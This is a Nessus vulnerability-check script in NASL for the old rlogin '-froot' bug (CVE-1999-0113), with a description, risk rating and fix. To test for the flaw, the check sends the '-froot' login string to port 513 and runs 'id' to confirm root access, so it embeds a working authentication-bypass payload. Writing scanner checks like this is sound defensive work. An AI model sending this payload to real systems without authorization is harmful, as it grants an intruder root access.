#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10161);
 script_bugtraq_id(458);
 script_version ("$Revision: 1.5 $");
 script_cve_id("CVE-1999-0113");
 name["english"] = "rlogin -froot";
 name["francais"] = "rlogin -froot";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote /bin/login seems to be vulnerable to the old
'rlogin -froot' bug.

Any attacker may use this old flaw to gain root access
on this system.

Solution : Upgrade your /bin/login, or comment out the 'rlogin' line in 
/etc/inetd.conf and restart the inetd process

Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for rlogin -froot";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Gain root remotely";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/rlogin", 513);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/rlogin");
if(!port)port = 513;

if(get_port_state(port))
{
 soc = open_priv_sock_tcp(dport:port);
 if(soc)
 {
  s1 = raw_string(0);
  s2 = "-froot" + raw_string(0) + "-froot" + raw_string(0) + "id" + raw_string(0);
  send(socket:soc, data:s1);
  send(socket:soc, data:s2);
  a = recv(socket:soc, length:1024, min:1);
  if(strlen(a))
   {
   send(socket:soc, data:string("id\r\n"));
   r = recv(socket:soc, length:4096);
   if("uid=" >< r)security_hole(port);
   }
  close(soc);
 }
}
